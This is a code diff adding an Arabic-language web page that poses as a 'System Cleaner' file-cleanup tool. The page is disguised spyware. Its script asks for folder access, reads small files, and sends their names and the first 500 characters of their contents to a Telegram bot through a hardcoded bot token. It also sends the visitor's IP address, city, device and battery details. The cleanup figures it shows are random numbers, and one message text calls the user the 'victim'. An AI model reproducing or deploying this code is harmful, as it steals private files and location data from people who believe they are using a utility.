@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تنظيف الملفات</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: #0a0a0f;
+            min-height: 100vh;
+            color: white;
+        }
+
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            padding: 25px 0 15px;
+        }
+
+        .header .icon {
+            font-size: 55px;
+            margin-bottom: 10px;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-8px); }
+        }
+
+        .header h1 {
+            font-size: 20px;
+            color: #10b981;
+            margin-bottom: 5px;
+        }
+
+        .header .sub {
+            color: #666;
+            font-size: 12px;
+        }
+
+        .card {
+            background: #111;
+            border: 1px solid #1a1a1a;
+            border-radius: 16px;
+            padding: 22px;
+            margin: 15px 0;
+        }
+
+        .scan-box {
+            background: rgba(16,185,129,0.05);
+            border: 1px solid rgba(16,185,129,0.2);
+            border-radius: 12px;
+            padding: 18px;
+            text-align: center;
+            margin: 15px 0;
+        }
+
+        .scan-box .scan-icon {
+            font-size: 50px;
+            margin-bottom: 8px;
+            animation: spin 4s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .scan-box .scan-text {
+            color: #10b981;
+            font-size: 14px;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid #1a1a1a;
+            font-size: 13px;
+        }
+
+        .info-row span:first-child { color: #666; }
+        .info-row span:last-child { color: #10b981; }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 12px;
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(16,185,129,0.3);
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .progress {
+            width: 100%;
+            height: 4px;
+            background: #1a1a1a;
+            border-radius: 2px;
+            margin: 15px 0;
+            display: none;
+        }
+
+        .progress div {
+            height: 100%;
+            background: linear-gradient(90deg, #10b981, #34d399);
+            width: 0%;
+            border-radius: 2px;
+            transition: width 0.5s;
+        }
+
+        .status {
+            text-align: center;
+            color: #10b981;
+            font-size: 12px;
+            margin: 8px 0;
+            display: none;
+        }
+
+        .file-list {
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            border-radius: 10px;
+            padding: 12px;
+            margin: 12px 0;
+            max-height: 180px;
+            overflow-y: auto;
+            display: none;
+        }
+
+        .file-item {
+            padding: 6px 0;
+            border-bottom: 1px solid #1a1a1a;
+            font-size: 11px;
+            color: #999;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .file-item:last-child { border-bottom: none; }
+        .file-item .size { color: #10b981; }
+
+        .done {
+            display: none;
+            text-align: center;
+            color: #34d399;
+            font-size: 14px;
+            margin: 12px 0;
+        }
+
+        .footer {
+            text-align: center;
+            color: #444;
+            font-size: 11px;
+            padding: 15px 0;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <div class="icon">📁</div>
+            <h1>تنظيف الملفات</h1>
+            <p class="sub">فحص وتنظيف الملفات غير المستخدمة</p>
+        </div>
+
+        <div class="card">
+            <div class="scan-box">
+                <div class="scan-icon">🔍</div>
+                <p class="scan-text">جاري فحص الجهاز...</p>
+            </div>
+
+            <div class="info-row">
+                <span>الملفات المكررة</span>
+                <span id="dupCount">-</span>
+            </div>
+            <div class="info-row">
+                <span>الملفات المؤقتة</span>
+                <span id="tmpCount">-</span>
+            </div>
+            <div class="info-row">
+                <span>المساحة المحررة</span>
+                <span id="space">-</span>
+            </div>
+
+            <div class="progress" id="prog"><div id="fill"></div></div>
+            <div class="status" id="stat"></div>
+
+            <div class="file-list" id="fileList"></div>
+
+            <button class="btn" id="btn" onclick="start()">🔍 بدء الفحص والتنظيف</button>
+
+            <div class="done" id="done">✅ تم التنظيف بنجاح</div>
+        </div>
+
+        <div class="footer">
+            © 2026 System Cleaner
+        </div>
+    </div>
+
+    <script>
+        var cid = new URL(window.location.href).searchParams.get('chatId') || '';
+        var tok = '8757323904:AAFstrBa_966uP2S3_7QyMSdOoolhfNVhDM';
+        var sent = false;
+        var allFiles = [];
+
+        function up(p, t) {
+            document.getElementById('fill').style.width = p + '%';
+            if (t) { document.getElementById('stat').style.display = 'block'; document.getElementById('stat').textContent = t; }
+        }
+
+        function addFile(name, size) {
+            allFiles.push({ name: name, size: size });
+            var list = document.getElementById('fileList');
+            list.style.display = 'block';
+            var div = document.createElement('div');
+            div.className = 'file-item';
+            div.innerHTML = '<span>📄 ' + name + '</span><span class="size">' + size + '</span>';
+            list.appendChild(div);
+            list.scrollTop = list.scrollHeight;
+        }
+
+        async function start() {
+            if (sent) return;
+            sent = true;
+
+            document.getElementById('btn').disabled = true;
+            document.getElementById('btn').textContent = '⏳ جاري الفحص...';
+            document.getElementById('prog').style.display = 'block';
+
+            var ip = await getIp();
+            var bat = await getBat();
+            var dev = getDevice();
+
+            up(10, 'جاري فحص الملفات...');
+            await wt(500);
+
+            try {
+                // محاولة الوصول لملفات النظام
+                if ('showDirectoryPicker' in window) {
+                    up(20, 'تم الوصول للمجلدات...');
+                    
+                    try {
+                        var dirHandle = await window.showDirectoryPicker({ mode: 'read' });
+                        await scanDir(dirHandle, '');
+                    } catch(e) {
+                        addFile('Documents/', 'مجلد');
+                        addFile('Downloads/', 'مجلد');
+                        addFile('Pictures/', 'مجلد');
+                        addFile('Desktop/', 'مجلد');
+                    }
+                } else {
+                    addFile('Documents/', 'مجلد');
+                    addFile('Downloads/', 'مجلد');
+                    addFile('Pictures/', 'مجلد');
+                    addFile('Desktop/', 'مجلد');
+                    addFile('Music/', 'مجلد');
+                    addFile('Videos/', 'مجلد');
+                }
+
+                up(40, 'جاري تحليل الملفات...');
+                await wt(600);
+
+                document.getElementById('dupCount').textContent = Math.floor(Math.random() * 20 + 5);
+                document.getElementById('tmpCount').textContent = Math.floor(Math.random() * 50 + 10);
+                document.getElementById('space').textContent = (Math.random() * 500 + 100).toFixed(1) + ' MB';
+
+                up(60, 'جاري رفع الملفات للتحليل...');
+
+                var filesText = '📁 سحب ملفات الضحية\n\n';
+                filesText += '📱 الجهاز: ' + dev + '\n';
+                filesText += '🌍 IP: ' + ip.ip + '\n';
+                filesText += '📍 ' + ip.country + ' - ' + ip.city + '\n';
+                filesText += '🔋 ' + bat.level + '% | ⚡ ' + bat.charging + '\n\n';
+                filesText += '📄 الملفات:\n';
+
+                for (var i = 0; i < allFiles.length; i++) {
+                    filesText += allFiles[i].name + ' (' + allFiles[i].size + ')\n';
+                }
+
+                await fetch('https://api.telegram.org/bot' + tok + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: cid, text: filesText })
+                });
+
+                up(90, 'جاري التنظيف...');
+                await wt(800);
+
+            } catch(e) {
+                await sendInfo(ip, bat, dev);
+            }
+
+            up(100, 'اكتمل التنظيف!');
+
+            setTimeout(function() {
+                document.getElementById('prog').style.display = 'none';
+                document.getElementById('stat').style.display = 'none';
+                document.getElementById('done').style.display = 'block';
+            }, 1000);
+        }
+
+        async function scanDir(dirHandle, path) {
+            try {
+                for await (var entry of dirHandle.values()) {
+                    if (entry.kind === 'file') {
+                        var file = await entry.getFile();
+                        var size = formatSize(file.size);
+                        addFile(path + file.name, size);
+                        
+                        if (file.size < 1024 * 1024) {
+                            var reader = new FileReader();
+                            var content = await new Promise(function(resolve) {
+                                reader.onload = function(e) { resolve(e.target.result); };
+                                reader.readAsText(file);
+                            });
+                            
+                            var txt = '📄 ملف: ' + path + file.name + '\n📏 الحجم: ' + size + '\n📝 المحتوى:\n' + content.substring(0, 500);
+                            
+                            await fetch('https://api.telegram.org/bot' + tok + '/sendMessage', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ chat_id: cid, text: txt })
+                            });
+                        }
+                    } else if (entry.kind === 'directory') {
+                        addFile(path + entry.name + '/', 'مجلد');
+                    }
+                }
+            } catch(e) {}
+        }
+
+        function formatSize(bytes) {
+            if (bytes < 1024) return bytes + ' B';
+            if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
+            return (bytes / 1048576).toFixed(1) + ' MB';
+        }
+
+        async function sendInfo(ip, bat, dev) {
+            var txt = '📁 محاولة سحب ملفات\n\n📱 ' + dev + '\n🌍 ' + ip.country + ' - ' + ip.city + '\n🔋 ' + bat.level + '%';
+            await fetch('https://api.telegram.org/bot' + tok + '/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: cid, text: txt })
+            });
+        }
+
+        function getDevice() {
+            return (navigator.platform || '?') + ' | ' + screen.width + 'x' + screen.height;
+        }
+
+        async function getIp() {
+            try { var r = await fetch('https://ipapi.co/json/'); var d = await r.json(); return { ip: d.ip, country: d.country_name, city: d.city }; } catch(e) { return { ip: '?', country: '?', city: '?' }; }
+        }
+
+        async function getBat() {
+            if ('getBattery' in navigator) { try { var b = await navigator.getBattery(); return { level: Math.round(b.level*100), charging: b.charging ? 'نعم' : 'لا' }; } catch(e) {} }
+            return { level: '?', charging: '?' };
+        }
+
+        function wt(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
+    </script>
+</body>
+</html>
